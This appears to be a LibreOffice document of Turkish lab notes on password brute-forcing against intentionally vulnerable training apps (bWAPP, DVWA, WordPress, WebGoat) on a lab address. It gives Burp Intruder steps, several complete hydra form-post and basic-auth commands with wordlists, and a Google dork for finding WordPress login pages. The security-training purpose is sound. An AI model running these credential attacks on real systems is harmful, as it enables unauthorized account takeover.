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2248e9" officeooo:paragraph-rsid="002248e9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2248e9" officeooo:paragraph-rsid="0023f90c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23f90c" officeooo:paragraph-rsid="0023f90c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2487e7" officeooo:paragraph-rsid="002487e7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257bf3" officeooo:paragraph-rsid="00257bf3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261119" officeooo:paragraph-rsid="00261119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275e6a" officeooo:paragraph-rsid="00275e6a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bold" officeooo:rsid="0023f90c" officeooo:paragraph-rsid="0023f90c" style:font-size-asian="10.5pt" style:font-weight-asian="bold" style:font-size-complex="10.5pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#c9211e" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="002248e9" officeooo:paragraph-rsid="002248e9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c9211e" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="002248e9" officeooo:paragraph-rsid="0023f90c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c9211e" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="002248e9" officeooo:paragraph-rsid="00257bf3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c9211e" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="002248e9" officeooo:paragraph-rsid="00275e6a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weight="bold" officeooo:rsid="0023f90c" officeooo:paragraph-rsid="0023f90c" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties officeooo:rsid="0023f90c"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties officeooo:rsid="00257bf3"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties officeooo:rsid="00275e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orm-Based Authentication (Burp Suite ile)</text:p>
      <text:p text:style-name="P4">Intercept açık ve 10.10.10.22 de bWAPP a giriyoruz.</text:p>
      <text:p text:style-name="P4">Boş login gönderiyoruz</text:p>
      <text:p text:style-name="P4">login logunu send to intruder.</text:p>
      <text:p text:style-name="P4">Login ve pass değişkenlerini ekliyoruz.</text:p>
      <text:p text:style-name="P4">Cluster bomb ile payloadları ayarlayıp saldırıyoruz.</text:p>
      <text:p text:style-name="P4">(bug)(bee)</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P12">Form-Based Authentication (Hydra ile)</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P5"><text:bookmark text:name="line1"/>&lt;form action="<text:a xlink:type="simple" xlink:href="view-source:http://10.10.10.22/bWAPP/login.php" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">/bWAPP/login.php</text:a>" method="POST"&gt;</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P11">form action u POST muş.</text:p>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P4"><text:bookmark text:name="line12"/>&lt;p&gt;&lt;label for="login"&gt;Login:&lt;/label&gt;&lt;br /&gt;</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:bookmark text:name="line56"/><text:s text:c="8"/>&lt;input type="text" id="login" name="login" size="20" autocomplete="off"&gt;&lt;/p&gt; </text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:bookmark text:name="line57"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:bookmark text:name="line58"/><text:s text:c="8"/>&lt;p&gt;&lt;label for="password"&gt;Password:&lt;/label&gt;&lt;br /&gt;</text:p>
      <text:p text:style-name="P16"><text:bookmark text:name="line59"/><text:s text:c="8"/>&lt;input type="password" id="password" name="password" size="20" autocomplete="off"&gt;&lt;/p&gt;</text:p>
      <text:p text:style-name="P17">login ve password için kullanılar isimleri bulduk. (name= den)</text:p>
      <text:p text:style-name="P4"><text:bookmark text:name="line11"/>&lt;button type="submit" name="form" value="submit"&gt;Login&lt;/button&gt; </text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P6">login butonunun formunun submit olması gerektiğini bulduk.</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">hydra 10.10.10.22 http-form-post "/bWAPP/login.php:login=^USER^&amp;password=^PASS^&amp;form=submit:Invalid credentials or user not activated!" -L /root/Desktop/users -P /root/Desktop/pass</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P6">1 deneme daha</text:p>
      <text:p text:style-name="P6">hydra 10.10.10.22 http-form-post "/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=login:Login failed" -L /root/Desktop/users -P /root/Desktop/pass</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P13">Form-Based Authentication <text:span text:style-name="T1">(Wordpress)</text:span></text:p>
      <text:p text:style-name="P7">wordpress ine girip wp-login.php ekliyoruz.</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7">hydra 10.10.10.22 http-form-post "/wordpress/wp-login.php:log=^USER^%pwd=^PASS^&amp;Login=submit:F=Err" -L /root/Desktop/users -P /root/Desktop/pass</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P8">inurl:wp-login.php <text:s/>ara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2">Basic </text:span>Authentication (Burp Suite ile)</text:p>
      <text:p text:style-name="P8">10.10.10.22 den OWASP WebGoat girmeye çalış.</text:p>
      <text:p text:style-name="P8">Intercepti açıp deneme girişi yap.</text:p>
      <text:p text:style-name="P8">Gelen code ların çoğu base64 kullanır, decode ediyoruz sağ tıklayıp.</text:p>
      <text:p text:style-name="P9">Intruder a ekleyip sniper atak yapacağız</text:p>
      <text:p text:style-name="P9">payload tipini Custom iterator yapıyoruz.</text:p>
      <text:p text:style-name="P9">Seperator ü : ayarlayıp kelimeleri yazdık.</text:p>
      <text:p text:style-name="P9">Payload processing den base-64 encoding seç.</text:p>
      <text:p text:style-name="P10">URL-encode kapadık.</text:p>
      <text:p text:style-name="P10">Guest:guest <text:s/>olarak bulduk.</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P15"><text:span text:style-name="T2">Basic </text:span>Authentication <text:span text:style-name="T3">(Hydra ile)</text:span></text:p>
      <text:p text:style-name="P10">hatalı girş yapıp URL alıyoruz.</text:p>
      <text:p text:style-name="P2">hydra 10.10.10.22 http-get "/WebGoat/attack" -L /root/Desktop/users -P /root/Desktop/pass -VV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8T17:19:46.860827244</dc:date>
    <meta:editing-duration>PT2H45M3S</meta:editing-duration>
    <meta:editing-cycles>10</meta:editing-cycles>
    <meta:generator>LibreOffice/7.4.1.1$Linux_X86_64 LibreOffice_project/40$Build-1</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="2" meta:paragraph-count="37" meta:word-count="198" meta:character-count="1959" meta:non-whitespace-character-count="1770"/>
  </office:meta>
</office:document-meta>
</file>